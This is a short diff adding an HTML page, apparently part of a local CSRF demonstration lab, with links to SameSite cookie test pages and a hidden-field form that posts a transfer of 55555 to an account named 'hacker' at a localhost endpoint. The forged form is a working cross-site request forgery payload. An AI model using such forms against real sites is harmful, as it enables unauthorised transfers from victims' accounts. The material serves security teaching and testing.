@@ -1,0 +1,7 @@
+<a href="csrf_html/same_site_lax_get.html">CSRF SameSite Lax Get</a></br>
+<a href="csrf_html/same_site_none_get.html">CSRF SameSite None Get</a>
+<form action="http://127.0.0.1:8000/csrf/transfer/" method="POST">
+    <input type="hidden" name="amount" value="55555">
+    <input type="hidden" name="account" value="hacker">
+    <input type="submit" value="Click me!">
+</form>
